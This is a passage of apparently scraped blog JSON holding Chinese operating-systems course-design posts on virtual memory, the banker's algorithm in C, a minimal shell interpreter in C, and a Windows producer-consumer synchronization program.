初始大小(MB)：无 最大值(MB)：无 3_驱动器：E: 可用空间：15260MB 初始大小(MB)：无 最大值(MB)：无 4_驱动器：F: 可用空间：14110MB 初始大小(MB)：无 最大值(MB)：无 5_所有驱动器页面文件大小的总数： 允许的最小值：16MB 推荐：5266MB 当前已分配：3511MB （2）了解和检测进程的虚拟内存空间。 步骤3**：** 虚拟内存每页容量为：4.00KB 最小应用地址：0x00010000 最大应用地址：0x7ffeffff 当前可供应用程序使用的内存空间为：1.99GB 当前计算机的实际内存大小为：4.00GB 理论上每个 Windows 应用程序可以独占的最大存储空间是：4.00GB 表5-4 自由区虚拟地址空间实验记录 地址 大小 虚拟地址空间类型 访问权限 描述 00134000-00140000 48.0KB Free NOACCESS 具有NOACCESS权限的内存区 00141000-00150000 60.0KB Free NOACCESS 具有NOACCESS权限的内存区 001b7000-001c0000 36.0KB Free NOACCESS 具有NOACCESS权限的内存区 00388000-00390000 32.0KB Free NOACCESS 具有NOACCESS权限的内存区 00391000-003a0000 60.0KB Free NOACCESS 具有NOACCESS权限的内存区 003a1000-003b0000 60.0KB Free NOACCESS 具有NOACCESS权限的内存区 003b7000-003c0000 36.0KB Free NOACCESS 具有NOACCESS权限的内存区 003c2000-00400000 248KB Free NOACCESS 具有NOACCESS权限的内存区 00485000-00520000 620KB Free NOACCESS 具有NOACCESS权限的内存区 00631000-00640000 60.0KB Free NOACCESS 具有NOACCESS权限的内存区 01240000-01310000 832KB Free NOACCESS 具有NOACCESS权限的内存区 01717000-73f10000 1.78GB Free NOACCESS 具有NOACCESS权限的内存区 770d7000-77130000 356KB Free NOACCESS 具有NOACCESS权限的内存区 77131000-7f6f0000 133MB Free NOACCESS 具有NOACCESS权限的内存区 7f7f0000-7ffa0000 7.68MB Free NOACCESS 具有NOACCESS权限的内存区 7ffd3000-7ffd7000 16.0KB Free NOACCESS 具有NOACCESS权限的内存区 7ffd8000-7ffdf000 28.0KB Free NOACCESS 具有NOACCESS权限的内存区 表5-5已调配区虚拟地址空间实验记录 地址 大小 虚拟地址空间类型 访问权限 描述 00010000-00020000 64.0KB Committed READWRITE 具有READWRITE权限的已调配Mapped内存区 00020000-00030000 64.0KB Committed READWRITE 具有READWRITE权限的已调配Mapped内存区 0012d000-0012e000 4.00KB Committed READWRITE 具有READWRITE权限的已调配私有内存区 0012e000-00130000 8.00KB Committed READWRITE 具有READWRITE权限的已调配Image内存区 00130000-00134000 16.0KB Committed READWRITE 具有READWRITE权限的已调配私有内存区 表5-6保留区虚拟地址空间实验记录 地址 大小 虚拟地址空间类型 访问权限 描述 00030000-0012d000 0.98MB Reserved READONLY 具有READONLY权限的已调配私有内存区 001c7000-00280000 740KB Reserved READONLY 具有READONLY权限的已调配私有内存区 00283000-00288000 20KB Reserved READONLY 具有READONLY权限的已调配私有内存区 00333000-00340000 52KB Reserved READONLY 具有READONLY权限的已调配Mapped内存区 0065f000-00740000 900KB Reserved READONLY 具有READONLY权限的已调配Mapped内存区","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"银行家算法的模拟与实现","date":"2021-06-22T06:28:20.000Z","path":"2021/06/22/银行家算法的模拟与实现/","text":"写在前面在这漫长的人生旅途中，我们总会遇到荆棘，难以逾越。有人选择放弃，有人忍痛前行。虽然两者并无高下之分，但我还是希望自己能够选择后者，无畏艰险，至死不渝。 银行家算法的模拟与实现(1) 进一步理解进程的并发执行。(2) 加强对进程死锁的理解，理解安全状态与不安全状态的概念。(3) 掌握使用银行家算法避免死锁问题。 基本概念 死锁：多个进程在执行过程中，因为竞争资源会造成相互等待的局面。如果没有外力作用，这些进程将永远无法向前推进。此时称系统处于死锁状态或者系统产生了死锁。 安全序列：系统按某种顺序并发进程，并使它们都能达到获得最大资源而顺序完成的序列为安全序列。 安全状态：能找到安全序列的状态称为安全状态，安全状态不会导致死锁。 不安全状态：在当前状态下不存在安全序列，则系统处于不安全状态。 银行家算法 银行家算法顾名思义是来源于银行的借贷业务，一定数量的本金要满足多个客户的借贷周转，为了防止银行家资金无法周转而倒闭，对每一笔贷款，必须考察其是否能限期归还。在操作系统中研究资源分配策略时也有类似问题，系统中有限的资源要供多个进程使用，必须保证得到的资源的进程能在有限的时间内归还资源，以供其它进程使用资源。如果资源分配不当，就会发生进程循环等待资源，则进程都无法继续执行下去的死锁现象。 当一进程提出资源申请时，银行家算法执行下列步骤以决定是否向其分配资源：1）检查该进程所需要的资源是否已超过它所宣布的最大值。2）检查系统当前是否有足够资源满足该进程的请求。3）系统试探着将资源分配给该进程，得到一个新状态。4）执行安全性算法，若该新状态是安全的，则分配完成；若新状态是不安全的，则恢复原状态，阻塞该进程。 本实验的内容是要通过编写和调试一个模拟系统动态分配资源的银行家算法程序，有效地避免死锁发生。具体要求如下：（1） 初始化时让系统拥有一定的资源；（2） 用键盘输入的方式允许进程动态申请资源；（3） 如果试探分配后系统处于安全状态，则修改系统的资源分配情况，正式分配资源；（4） 如果试探分配后系统处于不安全状态，则提示不能满足请求，恢复原状态并阻塞该进程。 数据结构进程个数n资源类数m可利用资源向量Available含有m个元素的数组，其中的每一个元素代表一类可利用的资源数目。如果Available[j]=K，则表示系统中现有Rj类资源K个。最大需求矩阵Maxn×m的矩阵，它定义了系统中n个进程中的每一个进程对m类资源的最大需求。如果Max[i,j]=K，则表示进程i需要Rj类资源的最大数目为K。分配矩阵Allocationn×m的矩阵，它定义了系统中每一类资源当前已分配给每一进程的资源数。如果Allocation[i,j]=K，则表示进程i当前已分得Rj类资源的 数目为K。需求矩阵Needn×m的矩阵，用以表示每一个进程尚需的各类资源数。如果Need[i,j]=K，则表示进程i还需要Rj类资源K个，方能完成其任务。Need[i,j]=Max[i,j]-Allocation[i,j] 安全检查算法 设置两个工作向量Work 记录系统当前可用资源量，初值为Available;finish 记录所有进程是否已被执行, 初值为长度为n，值均为False的向量。 从进程集合中找到一个满足下述条件的进程，finish == False;Need &lt;= Work;如找到，执行3；否则，执行4。 假设进程获得资源，可顺利执行，直至完成，从而释放资源。Work += Allocation;Finish=True;执行2 如所有的进程finish= True，则表示安全；否则系统不安全。 算法流程图 具体设计首先，将需要的变量定义为全局变量 12345678910111213int n; //进程数int m; //资源类数int *Available; //可使用资源向量int **Max; //最大需求矩阵int **Allocation; //分配矩阵int **Need; //需求矩阵bool safe = False;typedef struct&#123; int id; //进程ID int *req_src; //进程此次申请资源&#125;Request;Request* new_request; 如上，用到了Bool型变量，因此要定义 123#define True 1#define False 0typedef int bool; 下面列出了我们将要写的函数： 12345678void initial(); //初始化n,m,Available等的函数 void request(); //提出请求void process(); //处理bool safe_detect(); //安全性检测/*向量运算函数*/bool vector_compare(int *a, int *b, int len); void vector_add(int *a, int *b, int len);void vector_sub(int *a, int *b, int len); 首先给出几个向量运算函数的定义：定义a和b为两个等长向量,a &gt;= b 表示 a 中的每个元素都大于相应位置上的 b 的元素；a += b 表示 a 中的每个元素增加相应位置上的 b 的元素的值；a -= b 表示 a 中的每个元素都大于相应位置上的 b 的元素的值；例：a = [1,2,3];b = [1,1,1];则a &gt;= b;a += b; //a=[2,3,4]a -= b; //a=[0,1,2] 12345678910111213141516171819202122232425262728293031bool vector_compare(int *a, int *b, int len) // If vector a &gt;= vector b, return True&#123; int i = 0; while(i&lt;len) &#123; if(*(a+i)&lt;*(b+i)) return False; i++; &#125; return True;&#125;void vector_add(int *a, int *b, int len) //vector a += vector b&#123; int i = 0; while(i&lt;len) &#123; *(a+i) += *(b+i); i++; &#125; &#125;void vector_sub(int *a, int *b, int len) //vector a -= vector b&#123; int i = 0; while(i&lt;len) &#123; *(a+i) -= *(b+i); i++; &#125; &#125; 下面按算法步骤给出 initial(), request(), process(), safe_request() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129void initial()&#123; int i; int j; printf(&quot;请输入进程数:\\n&quot;); scanf(&quot;%d&quot;,&amp;n); printf(&quot;请输入资源类数:\\n&quot;); scanf(&quot;%d&quot;,&amp;m); printf(&quot;请输入可使用资源向量:\\n&quot;); Available = (int*)malloc(sizeof(int)*m); for(i=0; i&lt;m; i++) scanf(&quot;%d&quot;,&amp;Available[i]); printf(&quot;请输入最大需求矩阵:\\n&quot;); Max = (int**)malloc(sizeof(int*)*n); for(i=0; i&lt;n; i++) &#123; Max[i] = (int*)malloc(sizeof(int)*m); for(j=0; j&lt;m; j++) scanf(&quot;%d&quot;,&amp;Max[i][j]); &#125; printf(&quot;请输入分配矩阵:\\n&quot;); Allocation = (int**)malloc(sizeof(int*)*n); for(i=0; i&lt;n; i++) &#123; Allocation[i] = (int*)malloc(sizeof(int)*m); for(j=0; j&lt;m; j++) scanf(&quot;%d&quot;,&amp;Allocation[i][j]); &#125; Need = (int**)malloc(sizeof(int*)*n); for(i=0;i&lt;n;i++) &#123; Need[i] = (int *)malloc(sizeof(int)*m); for(j=0;j&lt;m;j++) Need[i][j] = Max[i][j] - Allocation[i][j]; &#125;&#125;void request()&#123; int i,id; new_request = (Request*)malloc(sizeof(Request)); new_request-&gt;req_src = (int*)malloc(sizeof(int)*m); printf(&quot;请输入进程的ID\\n&quot;); scanf(&quot;%d&quot;,&amp;id); new_request-&gt;id = id - 1; printf(&quot;请输入进程申请资源向量\\n&quot;); for(i=0; i&lt;m; i++) scanf(&quot;%d&quot;,&amp;new_request-&gt;req_src[i]);&#125;void process()&#123; int i = new_request-&gt;id; if(vector_compare(Need[i],new_request-&gt;req_src,m)) &#123; if(vector_compare(Available,new_request-&gt;req_src,m)) &#123; vector_sub(Available,new_request-&gt;req_src,m); vector_add(Allocation[i],new_request-&gt;req_src,m); vector_sub(Need[i],new_request-&gt;req_src,m); safe_detect(); &#125; else &#123; printf(&quot;程序所申请资源大于系统当前所剩资源，推迟执行!\\n&quot;); return; &#125; &#125; else &#123; printf(&quot;程序所申请资源大于该程序所需资源，无法执行!\\n&quot;); return; &#125; if(safe) &#123; printf(&quot;系统安全,进程可以执行!\\n&quot;); return; &#125; else &#123; printf(&quot;系统不安全,进程无法执行!\\n&quot;); vector_add(Available,new_request-&gt;req_src,m); vector_sub(Allocation[i],new_request-&gt;req_src,m); vector_add(Need[i],new_request-&gt;req_src,m); return; &#125; &#125;bool safe_detect()&#123; int *work = Available; bool *finish = (bool*)malloc(sizeof(bool)*n); int i; //初始化finish for(i=0; i&lt;n; i++) finish[i] = False; for(i=0; i&lt;n; i++) &#123; if(finish[i]==False&amp;&amp;vector_compare(work,Need[i],m)) &#123; printf(&quot;尝试执行第%d进程\\n&quot;,i+1); vector_add(work,Allocation[i],m); //尝试执行该进程，释放资源 finish[i] = True; i = -1; //尝试分配后，从头查找是否还有可以执行的进程，考虑到i++，故此处为-1 &#125; &#125; for(i=0; i&lt;n; i++) if(finish[i]==False) break; if(i==n) safe = True; else safe = False;&#125; 实现完整源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;#define True 1#define False 0typedef int bool;int n; //进程数int m; //资源类数int *Available; //可使用资源向量int **Max; //最大需求矩阵int **Allocation; //分配矩阵int **Need; //需求矩阵bool safe = False;typedef struct&#123; int id; int *req_src;&#125;Request;Request* new_request;void initial(); void request();void process();bool safe_detect();bool vector_compare(int *a, int *b, int len); void vector_add(int *a, int *b, int len);void vector_sub(int *a, int *b, int len);void show(int *a, int len);int main()&#123; initial(); request(); process(); return 0;&#125;void show(int *a, int len)&#123; int i = 0; while(i&lt;len) &#123; printf(&quot; %d&quot;,*(a+i)); i++; &#125; printf(&quot;\\n&quot;);&#125; bool vector_compare(int *a, int *b, int len) // If vector a &gt;= vector b, return True&#123; int i = 0; while(i&lt;len) &#123; if(*(a+i)&lt;*(b+i)) return False; i++; &#125; return True;&#125;void vector_add(int *a, int *b, int len) //vector a += vector b&#123; int i = 0; while(i&lt;len) &#123; *(a+i) += *(b+i); i++; &#125; &#125;void vector_sub(int *a, int *b, int len) //vector a -= vector b&#123; int i = 0; while(i&lt;len) &#123; *(a+i) -= *(b+i); i++; &#125; &#125;void initial()&#123; int i; int j; printf(&quot;请输入进程数:\\n&quot;); scanf(&quot;%d&quot;,&amp;n); printf(&quot;请输入资源类数:\\n&quot;); scanf(&quot;%d&quot;,&amp;m); printf(&quot;请输入可使用资源向量:\\n&quot;); Available = (int*)malloc(sizeof(int)*m); for(i=0; i&lt;m; i++) scanf(&quot;%d&quot;,&amp;Available[i]); printf(&quot;请输入最大需求矩阵:\\n&quot;); Max = (int**)malloc(sizeof(int*)*n); for(i=0; i&lt;n; i++) &#123; Max[i] = (int*)malloc(sizeof(int)*m); for(j=0; j&lt;m; j++) scanf(&quot;%d&quot;,&amp;Max[i][j]); &#125; printf(&quot;请输入分配矩阵:\\n&quot;); Allocation = (int**)malloc(sizeof(int*)*n); for(i=0; i&lt;n; i++) &#123; Allocation[i] = (int*)malloc(sizeof(int)*m); for(j=0; j&lt;m; j++) scanf(&quot;%d&quot;,&amp;Allocation[i][j]); &#125; Need = (int**)malloc(sizeof(int*)*n); for(i=0;i&lt;n;i++) &#123; Need[i] = (int *)malloc(sizeof(int)*m); for(j=0;j&lt;m;j++) Need[i][j] = Max[i][j] - Allocation[i][j]; &#125;&#125;void request()&#123; int i,id; new_request = (Request*)malloc(sizeof(Request)); new_request-&gt;req_src = (int*)malloc(sizeof(int)*m); printf(&quot;请输入进程的ID\\n&quot;); scanf(&quot;%d&quot;,&amp;id); new_request-&gt;id = id - 1; printf(&quot;请输入进程申请资源向量\\n&quot;); for(i=0; i&lt;m; i++) scanf(&quot;%d&quot;,&amp;new_request-&gt;req_src[i]);&#125;void process()&#123; int i = new_request-&gt;id; if(vector_compare(Need[i],new_request-&gt;req_src,m)) &#123; if(vector_compare(Available,new_request-&gt;req_src,m)) &#123; vector_sub(Available,new_request-&gt;req_src,m); vector_add(Allocation[i],new_request-&gt;req_src,m); vector_sub(Need[i],new_request-&gt;req_src,m); safe_detect(); &#125; else &#123; printf(&quot;程序所申请资源大于系统当前所剩资源，推迟执行!\\n&quot;); return; &#125; &#125; else &#123; printf(&quot;程序所申请资源大于该程序所需资源，无法执行!\\n&quot;); return; &#125; if(safe) &#123; printf(&quot;系统安全,进程可以执行!\\n&quot;); return; &#125; else &#123; printf(&quot;系统不安全,进程无法执行!\\n&quot;); vector_add(Available,new_request-&gt;req_src,m); vector_sub(Allocation[i],new_request-&gt;req_src,m); vector_add(Need[i],new_request-&gt;req_src,m); return; &#125; &#125;bool safe_detect()&#123; int *work = Available; bool *finish = (bool*)malloc(sizeof(bool)*n); int i; //初始化finish for(i=0; i&lt;n; i++) finish[i] = False; for(i=0; i&lt;n; i++) &#123; if(finish[i]==False&amp;&amp;vector_compare(work,Need[i],m)) &#123; printf(&quot;尝试执行第%d进程\\n&quot;,i+1); vector_add(work,Allocation[i],m); //尝试执行该进程，释放资源 finish[i] = True; i = -1; //尝试分配后，从头查找是否还有可以执行的进程，考虑到i++，故此处为-1 &#125; &#125; for(i=0; i&lt;n; i++) if(finish[i]==False) break; if(i==n) safe = True; else safe = False;&#125; 效果如图所示：","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"简单shell命令行解释器的设计与实现","date":"2021-06-22T06:04:48.000Z","path":"2021/06/22/简单-shell-命令行解释器-的设计与-实现/","text":"写在前面我们总会站在前人的肩膀上去眺望远方，无论是课程设计还是人生皆如此。 简单shell命令行解释器的设计与实现要设计的 shell 类似于 sh,bash,csh 等，必须支持以下内部命令： cd &lt;目录&gt;更改当前的工作目录到另一个&lt;目录&gt;。如果&lt;目录&gt;未指定，输出当前工作目录。如果&lt;目录&gt;不存在，应当有适当的错误信息提示。这个命令应该也能改变 PWD 的环境变量。 environ 列出所有环境变量字符串的设置（类似于 Linux 系统下的 env 命令）。 echo &lt; 内容 &gt; 显示 echo 后的内容且换行。 help 简短概要的输出你的 shell 的使用方法和基本功能。 jobs 输出 shell 当前的一系列子进程，必须提供子进程的命名和 PID 号。 quit,exit,bye 退出 shell。 提示：shell 的主体就是反复下面的循环过程 12345678910while(1)&#123;//接收用户输入的命令行；//解析命令行；if(//用户命令为内部命令)//直接处理；else if(//用户命令为外部命令)//创建子进程执行命令；else//提示错误的命令；&#125; 实现代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;errno.h&gt;#include &lt;sys/stat.h&gt;char command(char *s)&#123; if(!strncasecmp(s,&quot;exit&quot;,4)) return &#x27;q&#x27;; else if(!strncasecmp(s,&quot;quit&quot;,4)) return &#x27;q&#x27;; else if(!strncasecmp(s,&quot;bye&quot;,4)) return &#x27;q&#x27;; else if(!strncasecmp(s,&quot;cd&quot;,2)) return 1; else if(!strncasecmp(s,&quot;ls&quot;,2)) return 2; else if(!strncasecmp(s,&quot;rm&quot;,2)) return 3; else if(!strncasecmp(s,&quot;mkdir&quot;,5)) return 4; else if(!strncasecmp(s,&quot;echo&quot;,4)) return 5; else if(!strncasecmp(s,&quot;help&quot;,4)) return 6; else if(!strncasecmp(s,&quot;env&quot;,3)) return 7; else if(!strncasecmp(s,&quot;jobs&quot;,4)) return 8; else if (!strncasecmp(s,&quot;clean&quot;,5)) return 9; else return 0;&#125;void help()&#123; printf( &quot;\\t*****************帮助********************\\n&quot; &quot;\\t* 命令 功能\\n&quot; &quot;\\t* cd 更改当前的工作目录到另一个&lt;目录&gt;\\n&quot; &quot;\\t* environ 列出所有环境变量字符串的设置\\n&quot; &quot;\\t* echo 显示echo后面的内容并换行\\n&quot; &quot;\\t* help 显示帮助信息\\n&quot; &quot;\\t* jobs 输出shell当前的一系列子进程，包括子进程的命名和PID号\\n&quot; &quot;\\t* ls 显示当前目录的所有文件\\n&quot; &quot;\\t* rm 删除当前目录下的文件或目录\\n&quot; &quot;\\t* mkdir 在当前目录下创建新目录\\n&quot; &quot;\\t* clean 清屏\\n&quot; &quot;\\t* quit|exit|bye 退出shell\\n&quot; &quot;\\t*****************************************\\n&quot;);&#125;int main()&#123; char n[100],n1[100]; char b; pid_t pid; help(); while(1) &#123; memset(n,0,100); printf(&quot;%s_@_$：&quot;,getcwd(n1,100)); // print the information; fgets(n,100,stdin); //input cmdline; n[strlen(n)-1]=&#x27;\\0&#x27;; //delete the &#x27;\\n&#x27;; b=command(n); //get the return values; if(b==&#x27;q&#x27;) break; //exit the shell; switch(b) &#123; //change the directory case 1: if(chdir(n+3)!=0) printf(&quot; 打开工作目录(%s)失败!\\n&quot;,n+3);//+3 = &#x27;c&#x27;,&#x27;d&#x27;,&#x27;\\0&#x27;,后面的数字为输入命令的字符个数加+1（‘\\0’占一个字符）; printf(&quot; 当前工作目录：&#x27;%s&#x27;\\n&quot;,getcwd(n1,100)); break; //list case 2: if((pid=fork())&lt;0) &#123; printf(&quot; fork error\\n&quot;); exit(EXIT_FAILURE); &#125; else if(pid==0) &#123; if(execl(&quot;/bin/ls&quot;,&quot;ls&quot;,NULL)&lt;0); printf(&quot; execl error\\n&quot;); exit(EXIT_FAILURE); &#125; waitpid(pid,0,0); break; //remove a directory case 3: remove(n+3); printf(&quot; 文件已删除!\\n&quot;); break; //make a directory case 4: mkdir(n+6,S_IRWXU); printf(&quot; 文件创建成功!\\n&quot;); break; //print something case 5: printf(&quot; %s\\n&quot;,n+5); break; //help case 6: help(); break; //environment case 7: if((pid=fork())&lt;0) &#123; printf(&quot; fork error\\n&quot;); exit(EXIT_FAILURE); &#125; else if(pid==0) &#123; if(execl(&quot;/bin/env&quot;,&quot;env&quot;,NULL)&lt;0) printf(&quot; execl error\\n&quot;); exit(EXIT_FAILURE); &#125; waitpid(pid,0,0); break; //ps the running process ; case 8: system(&quot;ps&quot;);//systemcall_ps break; case 9: system(&quot;clear&quot;); break; //cmd can&#x27;t find; case 0: printf(&quot;PID: %ld.没有此命令，请重新输入正确的命令。\\n&quot;, (long)getpid()); help(); break; &#125; &#125; return 0;&#125; 效果如图所示： 输入不同的命令： 总结shell使用fork函数创建新的进程，用exec在新进程中运行用户指定的程序，最后shell用wait等待新进程的结束。wait系统调用同时从内核取得退出状态以告知子进程是如何结束的。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"操作系统课程设计(四)-Windows的互斥与同步","date":"2021-06-22T02:50:46.000Z","path":"2021/06/22/操作系统课程设计-四/","text":"写在前面又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！ Windows 的互斥与同步 实验目的 (1) 回顾操作系统进程、线程的有关概念，加深对 Windows 线程的理解。(2) 了解互斥体对象，利用互斥与同步操作编写生产者-消费者问题的并发程序，加深对 P (即semWait)、V(即 semSignal)原语以及利用 P、V 原语进行进程间同步与互斥操作的理解。 实验内容和步骤 创建一个“Win32 Consol Application”工程，然后拷贝清单 4-1 中的程序，编译成可执行文件。 步骤 2：在“命令提示符”窗口运行步骤 1 中生成的可执行文件，列出运行结果。 步骤 3：仔细阅读源程序，找出创建线程的 WINDOWS API 函数，回答下列问题：线程的第一个执行函数是什么（从哪里开始执行）？它位于创建线程的 API 函数的第几个参数中？ 步骤 4：修改清单 4-1 中的程序，调整生产者线程和消费者线程的个数，使得消费者数目大与生产者，看看结果有何不同。察看运行结果，从中你可以得出什么结论？ 步骤 5：修改清单 4-1 中的程序，按程序注释中的说明修改信号量 EmptySemaphore 的初始化方法，看看结果有何不同。 步骤 6：根据步骤 4 的结果，并查看 MSDN，回答下列问题：1）CreateMutex 中有几个参数，各代表什么含义。2）CreateSemaphore 中有几个参数，各代表什么含义，信号量的初值在第几个参数中。3）程序中 P、V 原语所对应的实际 Windows API 函数是什么，写出这几条语句。4）CreateMutex 能用 CreateSemaphore 替代吗？尝试修改程序 4-1，将信号量 Mutex 完全用CreateSemaphore 及相关函数实现。写出要修改的语句。 流程图如下： 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &lt;windows.h&gt;#include &lt;iostream&gt;const unsigned short SIZE_OF_BUFFER = 2; //缓冲区长度unsigned short ProductID = 0; //产品号unsigned short ConsumeID = 0; //将被消耗的产品号unsigned short in = 0; //产品进缓冲区时的缓冲区下标unsigned short out = 0; //产品出缓冲区时的缓冲区下标int buffer[SIZE_OF_BUFFER]; //缓冲区是个循环队列bool p_ccontinue = true; //控制程序结束HANDLE Mutex; //用于线程间的互斥HANDLE FullSemaphore; //当缓冲区满时迫使生产者等待HANDLE EmptySemaphore; //当缓冲区空时迫使消费者等待DWORD WINAPI Producer(LPVOID); //生产者线程DWORD WINAPI Consumer(LPVOID); //消费者线程int main()&#123;//创建各个互斥信号//注意，互斥信号量和同步信号量的定义方法不同，互斥信号量调用的是 CreateMutex 函数，同步信号量调用的是 CreateSemaphore 函数，函数的返回值都是句柄。Mutex = CreateMutex(NULL,FALSE,NULL);EmptySemaphore = CreateSemaphore(NULL,SIZE_OF_BUFFER,SIZE_OF_BUFFER,NULL);//将上句做如下修改，看看结果会怎样//EmptySemaphore = CreateSemaphore(NULL,0,SIZE_OF_BUFFER-1,NULL);FullSemaphore = CreateSemaphore(NULL,0,SIZE_OF_BUFFER,NULL);//调整下面的数值，可以发现，当生产者个数多于消费者个数时，//生产速度快，生产者经常等待消费者；反之，消费者经常等待const unsigned short PRODUCERS_COUNT = 3; //生产者的个数const unsigned short CONSUMERS_COUNT = 1; //消费者的个数//总的线程数const unsigned short THREADS_COUNT = PRODUCERS_COUNT+CONSUMERS_COUNT;HANDLE hThreads[THREADS_COUNT]; //各线程的 handleDWORD producerID[PRODUCERS_COUNT]; //生产者线程的标识符DWORD consumerID[CONSUMERS_COUNT]; //消费者线程的标识符//创建生产者线程for (int i=0;i&lt;PRODUCERS_COUNT;++i)&#123;hThreads[i]=CreateThread(NULL,0,Producer,NULL,0,&amp;producerID[i]);if (hThreads[i]==NULL) return -1;&#125;//创建消费者线程for (i=0;i&lt;CONSUMERS_COUNT;++i)&#123;hThreads[PRODUCERS_COUNT+i]=CreateThread(NULL,0,Consumer,NULL,0,&amp;consumerID[i]);if (hThreads[i]==NULL) return -1;&#125;while(p_ccontinue)&#123;if(getchar())&#123; //按回车后终止程序运行p_ccontinue = false;&#125;&#125;return 0;&#125;//生产一个产品。简单模拟了一下，仅输出新产品的 ID 号void Produce()&#123;std::cout &lt;&lt; std::endl&lt;&lt; &quot;Producing &quot; &lt;&lt; ++ProductID &lt;&lt; &quot; ... &quot;;std::cout &lt;&lt; &quot;Succeed&quot; &lt;&lt; std::endl;&#125;//把新生产的产品放入缓冲区void Append()&#123;std::cerr &lt;&lt; &quot;Appending a product ... &quot;;buffer[in] = ProductID;in = (in+1)%SIZE_OF_BUFFER;std::cerr &lt;&lt; &quot;Succeed&quot; &lt;&lt; std::endl;//输出缓冲区当前的状态for (int i=0;i&lt;SIZE_OF_BUFFER;++i)&#123;std::cout &lt;&lt; i &lt;&lt;&quot;: &quot; &lt;&lt; buffer[i];if (i==in) std::cout &lt;&lt; &quot; &lt;-- 生产&quot;;if (i==out) std::cout &lt;&lt; &quot; &lt;-- 消费&quot;;std::cout &lt;&lt; std::endl;&#125;&#125;//从缓冲区中取出一个产品void Take()&#123;std::cerr &lt;&lt; &quot;Taking a product ... &quot;;ConsumeID = buffer[out];buffer[out] = 0;out = (out+1)%SIZE_OF_BUFFER;std::cerr &lt;&lt; &quot;Succeed&quot; &lt;&lt; std::endl;//输出缓冲区当前的状态for (int i=0;i&lt;SIZE_OF_BUFFER;++i)&#123;std::cout &lt;&lt; i &lt;&lt;&quot;: &quot; &lt;&lt; buffer[i];if (i==in) std::cout &lt;&lt; &quot; &lt;-- 生产&quot;;if (i==out) std::cout &lt;&lt; &quot; &lt;-- 消费&quot;;std::cout &lt;&lt; std::endl;&#125;&#125;//消耗一个产品void Consume()&#123;std::cout &lt;&lt; &quot;Consuming &quot; &lt;&lt; ConsumeID &lt;&lt; &quot; ... &quot;;std::cout &lt;&lt; &quot;Succeed&quot; &lt;&lt; std::endl;&#125;//生产者DWORD WINAPI Producer(LPVOID lpPara)&#123;while(p_ccontinue)&#123;WaitForSingleObject(EmptySemaphore,INFINITE); //p(empty);WaitForSingleObject(Mutex,INFINITE); //p(mutex);Produce();Append();Sleep(1500);ReleaseMutex(Mutex); //V(mutex);ReleaseSemaphore(FullSemaphore,1,NULL); //V(full);&#125;return 0;&#125;//消费者DWORD WINAPI Consumer(LPVOID lpPara)&#123;while(p_ccontinue)&#123;WaitForSingleObject(FullSemaphore,INFINITE); //P(full);WaitForSingleObject(Mutex,INFINITE); //P(mutex);Take();Consume();Sleep(1500);ReleaseMutex(Mutex); //V(mutex);ReleaseSemaphore(EmptySemaphore,1,NULL); //V(empty);&#125;return 0;&#125; 分析： 仔细阅读源程序，找出创建线程的 WINDOWS API 函数，回答下列问题：线程的第一个执行函数是什么（从哪里开始执行）？它位于创建线程的 API 函数的第几个参数中？ 线程执行的第一个函数是DWORD WINAPI Producer(LPVOIDIpPara)，从hThreads[i]=CreateThread(NULL,0,Producer,NULL,0,&amp;producerID[i]);开始执行，位于创建线程的API函数的第三个参数中。 修改清单 4-1 中的程序，调整生产者线程和消费者线程的个数，使得消费者数目大与生产者，看看结果有何不同。察看运行结果，从中你可以得出什么结论？ 当生产者个数多于消费者个数时，生产速度快，生产者经常等待消费者。反之，消费者等待。 修改清单 4-1 中的程序，按程序注释中的说明修改信号量 EmptySemaphore 的初始化方法，看看结果有何不同。 无法执行 1）CreateMutex 中有几个参数，各代表什么含义。 